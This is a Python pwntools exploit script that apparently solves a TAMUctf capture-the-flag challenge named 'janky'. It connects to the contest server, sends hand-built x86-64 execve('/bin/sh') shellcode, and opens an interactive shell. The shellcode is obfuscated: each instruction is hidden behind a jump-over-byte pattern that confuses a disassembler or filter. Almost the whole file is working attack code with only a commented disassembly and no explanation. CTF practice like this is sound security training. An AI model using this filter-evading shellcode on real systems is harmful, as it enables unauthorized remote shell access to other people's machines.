from pwn import *

context.arch = 'amd64'

p = remote("tamuctf.com", 443, ssl=True, sni="janky")
# p = process("./janky")
# pause()

'''
   0:   48 31 c0                xor    rax, rax
   3:   48 83 c8 68             or     rax, 0x68
   7:   48 c1 e0 08             shl    rax, 0x8
   b:   48 83 c8 73             or     rax, 0x73
   f:   48 c1 e0 08             shl    rax, 0x8
  13:   48 83 c8 2f             or     rax, 0x2f
  17:   48 c1 e0 08             shl    rax, 0x8
  1b:   48 83 c8 6e             or     rax, 0x6e
  1f:   48 c1 e0 08             shl    rax, 0x8
  23:   48 83 c8 69             or     rax, 0x69
  27:   48 c1 e0 08             shl    rax, 0x8
  2b:   48 83 c8 62             or     rax, 0x62
  2f:   48 c1 e0 08             shl    rax, 0x8
  33:   48 83 c8 2f             or     rax, 0x2f
  37:   50                      push   rax
  38:   48 89 e7                mov    rdi, rsp
  3b:   48 31 f6                xor    rsi, rsi
  3e:   48 31 d2                xor    rdx, rdx
  41:   6a 3b                   push   0x3b
  43:   58                      pop    rax
  44:   0f 05                   syscall
'''

shellcode = flat(
    b'\xeb\x01', b'\xe9', b'\x48\x31\xc0\x90'
    b'\xeb\x01', b'\xe9', b'\x48\x83\xc8\x68'
    b'\xeb\x01', b'\xe9', b'\x48\xc1\xe0\x08'
    b'\xeb\x01', b'\xe9', b'\x48\x83\xc8\x73'
    b'\xeb\x01', b'\xe9', b'\x48\xc1\xe0\x08'
    b'\xeb\x01', b'\xe9', b'\x48\x83\xc8\x2f'
    b'\xeb\x01', b'\xe9', b'\x48\xc1\xe0\x08'
    b'\xeb\x01', b'\xe9', b'\x48\x83\xc8\x6e'
    b'\xeb\x01', b'\xe9', b'\x48\xc1\xe0\x08'
    b'\xeb\x01', b'\xe9', b'\x48\x83\xc8\x69'
    b'\xeb\x01', b'\xe9', b'\x48\xc1\xe0\x08'
    b'\xeb\x01', b'\xe9', b'\x48\x83\xc8\x62'
    b'\xeb\x01', b'\xe9', b'\x48\xc1\xe0\x08'
    b'\xeb\x01', b'\xe9', b'\x48\x83\xc8\x2f'
    b'\xeb\x01', b'\xe9', b'\x50\x90\x90\x90'
    b'\xeb\x01', b'\xe9', b'\x48\x89\xe7\x90'
    b'\xeb\x01', b'\xe9', b'\x48\x31\xf6\x90'
    b'\xeb\x01', b'\xe9', b'\x48\x31\xd2\x90'
    b'\xeb\x01', b'\xe9', b'\x6a\x3b\x90\x90'
    b'\xeb\x01', b'\xe9', b'\x58\x90\x90\x90'
    b'\xeb\x01', b'\xe9', b'\x0f\x05\x90\x90'
)

p.send(shellcode)

p.interactive()
